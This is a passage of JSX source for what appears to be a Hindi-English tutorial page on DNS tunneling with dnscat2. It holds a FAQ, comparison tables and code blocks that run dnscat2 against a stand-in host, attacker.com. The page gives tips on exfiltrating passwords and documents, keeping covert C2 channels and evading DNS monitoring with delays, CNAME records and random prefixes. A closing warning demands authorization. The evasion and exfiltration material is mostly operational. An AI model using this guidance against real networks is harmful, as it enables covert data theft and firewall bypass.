          { q: 'DNS tunneling कैसे काम करता है?', a: 'Data को DNS queries में encode करके भेजा जाता है। Client data.attacker.com जैसी query भेजता है — "data" में actual data encoded होता है। Server query receive करके decode करता है। Response DNS reply में आता है।' },
          { q: 'कितना fast है DNS tunneling?', a: 'बहुत slow — HTTP/S से 100x slow। TXT records fastest हैं (~50 KB/s)। A records slowest (~1-2 KB/s)। सिर्फ commands और छोटे files transfer के लिए useful है।' },
          { q: 'क्या यह detect हो सकता है?', a: 'हाँ, DNS query length, frequency, entropy analysis, और ML-based detection से detect हो सकता है। लेकिन normally networks पर DNS monitoring rare है — इसलिए effective है।' },
          { q: 'DNS record कैसे configure करें?', a: 'Domain registrar में NS record add करो जो attacker server को point करे। A record से NS hostname को server IP से map करो। dnscat2 server को उस domain के साथ start करो।' },
          { q: 'क्या DNS over HTTPS (DoH) से tunneling possible है?', a: 'हाँ, dnscat2 DoH support करता है। यह और stealthy होता है क्योंकि HTTPS traffic में DNS queries hide हो जाती हैं। Corporate proxy bypass करने के लिए best।' },
          { q: 'क्या mobile पर काम करता है?', a: 'Client side पर technically हाँ, लेकिन pre-compiled mobile binaries नहीं हैं। Termux (Android) पर compile कर सकते हो। iOS पर difficult है।' },
          { q: 'Large files transfer कैसे करें?', a: 'Large files directly transfer मत करो — बहुत slow होगा। Compress करो (gzip), split करो (10KB chunks), और chunks transfer करो। Server पर reassemble करो।' },
          { q: 'क्या यह corporate firewall bypass कर सकता है?', a: 'हाँ, यही इसका main use case है। Corporate networks DNS allow करते हैं — internet काम करने के लिए ज़रूरी है। DNS tunnel इसी channel का misuse करता है।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Iodine</td><td className="py-2 px-3">DNS tunneling (IP over DNS)</td><td className="py-2 px-3">Faster, full IP tunnel, IPv6 support</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">dns2tcp</td><td className="py-2 px-3">DNS tunneling (TCP over DNS)</td><td className="py-2 px-3">Lightweight, C-based</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">DNScat</td><td className="py-2 px-3">DNS tunneling (original)</td><td className="py-2 px-3">Simple, older version</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Cobalt Strike</td><td className="py-2 px-3">C2 with DNS channel</td><td className="py-2 px-3">Commercial, malleable C2</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Sliver</td><td className="py-2 px-3">C2 framework</td><td className="py-2 px-3">DNS/WireGuard/HTTP C2</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">dnstunnel</td><td className="py-2 px-3">DNS tunneling</td><td className="py-2 px-3">Python-based, simple</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">NSTX</td><td className="py-2 px-3">IP over DNS</td><td className="py-2 px-3">Old but reliable</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">YourFreedom</td><td className="py-2 px-3">DNS/ICMP tunneling</td><td className="py-2 px-3">GUI, easy setup</td></tr>
          </tbody>
        </table>
      </div>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside mt-2 space-y-1">
          <li>DNS tunneling backup C2 के लिए best है — primary HTTP/S fail होने पर</li>
          <li>--secret flag से encryption enable करो — बिना key के data readable होगा</li>
          <li>TXT records से ज़्यादा data transfer होता है per query — fastest option</li>
          <li>--delay से slow transfer करो — detection avoid होगी (2000ms+ recommended)</li>
          <li>DNS propagation में 24-48 hours लग सकते हैं — पहले setup करो</li>
          <li>Large files के लिए DNS tunneling मत use करो — slow है, HTTP/S use करो</li>
          <li>Compression (gzip) से transfer size 70-90% reduce होती है</li>
          <li>CNAME records stealthiest हैं — least monitored DNS record type</li>
        </ul>
      </div>

      <h2>Real-World Use Cases</h2>
      <p>
        DNS tunneling real-world scenarios में कैसे use होता है:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Red Team Operations:</strong> Primary C2 fail होने पर backup channel के रूप में। Cobalt Strike DNS beacon + dnscat2 combo</li>
        <li><strong className="text-white">Data Exfiltration:</strong> Sensitive data (passwords, configs, documents) DNS के through secretly बाहर भेजना</li>
        <li><strong className="text-white">Restricted Networks:</strong> जहाँ सिर्फ DNS allowed है — airports, hotels, corporate guest networks</li>
        <li><strong className="text-white">Captive Portal Bypass:</strong> Hotel/airport WiFi captive portals DNS allow करते हैं — tunnel से internet access</li>
        <li><strong className="text-white">IoT Device Control:</strong> IoT devices जिनमें limited network access है — DNS tunnel से C2</li>
        <li><strong className="text-white">Penetration Testing:</strong> Client networks पर firewall egress testing — DNS allowed है या नहीं</li>
        <li><strong className="text-white">Incident Response:</strong> Compromised network से data exfiltration detect करने के लिए DNS monitoring</li>
        <li><strong className="text-white">Bug Bounty:</strong> Firewall egress testing — client networks की DNS policy test करना</li>
        <li><strong className="text-white">Research:</strong> DNS protocol analysis और security research — tunneling techniques study करना</li>
      </ul>

      <h2>DNS Tunneling Performance Optimization</h2>
      <CodeBlock
        title="Speed Optimization Tips"
        code={`# DNS tunneling slow है लेकिन optimize कर सकते हो:

# 1. Record type selection:
# TXT = fastest (up to 64KB per query)
# CNAME = medium (~255 bytes)
# A = slowest (4 bytes)

# 2. Max length increase:
./dnscat2 --dns server=attacker.com --max-length=255
# Default 255, increase if DNS server supports

# 3. No delay:
./dnscat2 --dns server=attacker.com --delay=0
# Stealth के लिए delay ज़रूरी है, speed के लिए नहीं

# 4. Parallel queries (multiple sessions):
# Multiple client instances run करो
# Each with different session ID

# 5. Compression:
# Files transfer से पहले compress करो
gzip -9 file.txt  # Maximum compression
# 70-90% size reduction

# 6. Binary encoding:
# Base64 से binary encoding better है
# Less overhead per byte

# 7. DNS caching disable:
# Server: --no-cache
# Client: --no-cache
# Fresh queries हर बार

# 8. Local DNS resolver:
# Caching DNS resolver use करो
# Repeated queries faster resolve होंगे`}
      />

      <h2>DNS Tunneling vs HTTP/S C2</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">DNS Tunnel</th>
              <th className="text-left py-2 px-3 text-neon-green">HTTP/S C2</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Speed</td><td className="py-2 px-3">Slow (10-50 KB/s)</td><td className="py-2 px-3">Fast (1+ MB/s)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Firewall Bypass</td><td className="py-2 px-3">Excellent (DNS rarely blocked)</td><td className="py-2 px-3">Good (HTTP/S usually allowed)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Detection</td><td className="py-2 px-3">Hard (DNS monitoring rare)</td><td className="py-2 px-3">Medium (proxy logs, SSL inspection)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Reliability</td><td className="py-2 px-3">High (DNS always works)</td><td className="py-2 px-3">Medium (proxy blocking)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Data Transfer</td><td className="py-2 px-3">Small files only</td><td className="py-2 px-3">Large files possible</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Setup Complexity</td><td className="py-2 px-3">Medium (DNS config needed)</td><td className="py-2 px-3">Easy (web server)</td></tr>
            <tr><td className="py-2 px-3 text-white">Best Use</td><td className="py-2 px-3">Backup C2, restricted networks</td><td className="py-2 px-3">Primary C2, data exfil</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Cobalt Strike DNS Beacon Comparison</h2>
      <p>
        Cobalt Strike commercial C2 framework है जिसमें DNS beacon built-in है। dnscat2 free alternative है।
      </p>
      <CodeBlock
        title="Cobalt Strike vs dnscat2"
        code={`# Cobalt Strike DNS Beacon:
# - Commercial ($3,500-$5,600/year)
# - Malleable C2 profiles (customizable)
# - SMB, TCP, HTTP, DNS beacons
# - Built-in lateral movement
# - GUI interface

# dnscat2:
# - Free (open source)
# - DNS-only C2
# - Command-line interface
# - Shell access + file transfer
# - Simple setup

# Combined approach (best practice):
# Primary: Cobalt Strike HTTP/S beacon (fast, feature-rich)
# Backup: dnscat2 DNS tunnel (always works)
# अगर HTTP/S block हो जाए → DNS tunnel activate

# Red team infrastructure:
# Multiple C2 channels maintain करो
# DNS tunnel हमेशा backup में ready रखो
# Different record types use करो (avoid pattern detection)`}
      />

      <h2>DNS Tunneling in Different Environments</h2>
      <CodeBlock
        title="Environment-Specific Setup"
        code={`# Corporate Network:
# - Usually has DNS monitoring
# - Use --delay=3000+ for stealth
# - CNAME records (least monitored)
# - Random prefixes
# - Low query frequency

# Hotel/Airport WiFi:
# - DNS usually allowed (captive portal)
# - May have DNS filtering
# - Use DoH if possible
# - Test first: nslookup test.attacker.com

# IoT/Embedded Devices:
# - Limited DNS client capabilities
# - May need custom client
# - A records often only option
# - Very slow but works

# Cloud Environments:
# - AWS/Azure/GCP DNS services
# - Route53, Azure DNS, Cloud DNS
# - Usually no DNS filtering
# - Fast DNS resolution

# Mobile Networks:
# - DNS usually allowed
# - May have DNS caching
# - --no-cache flag on server
# - Carrier-grade NAT (CGNAT) considerations`}
      />

      <h2>Troubleshooting Guide</h2>
      <CodeBlock
        title="Common Issues and Fixes"
        code={`# Issue 1: "DNS query failed"
# Fix: DNS records verify करो
dig NS dns.attacker.com
dig A ns.dns.attacker.com
# Expected: attacker server IP

# Issue 2: "Connection timeout"
# Fix: Firewall rules check करो
sudo iptables -L -n | grep 53
sudo ufw status | grep 53
# Port 53 UDP/TCP open होना चाहिए

# Issue 3: "Encryption failed"
# Fix: Same key both sides
# Server: --secret=KEY
# Client: --secret=KEY (identical)
# Key में special characters avoid करो

# Issue 4: "Slow transfer"
# Fix: Record type change करो
# --type=TXT (fastest)
# --max-length=255 (max per query)
# --delay=0 (no delay)

# Issue 5: "Queries detected"
# Fix: Stealth options enable करो
# --delay=2000-5000
# --prefix=random
# --type=CNAME (stealthiest)
# --max-length=63 (normal-looking)

# Issue 6: "Port 53 busy"
# Fix: Local DNS server stop करो
sudo systemctl stop systemd-resolved
sudo systemctl disable systemd-resolved
# या different port use करो: --dnsport=5353`}
      />

      <div className="warning-box mt-6">
        <strong>⚠️ Final Warning:</strong> DNS tunneling से data exfiltration और C2 बनाना unauthorized access है। Corporate networks पर DNS monitoring होती है — detect होने पर serious consequences हैं। हमेशा written authorization लो। Document everything। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत C2 channel अपराध है — 3 साल तक की जेल और जुर्माना हो सकता है। केवल authorized red team operations और lab testing में ही उपयोग करें।
      </div>
    </TutorialLayout>
  )
}
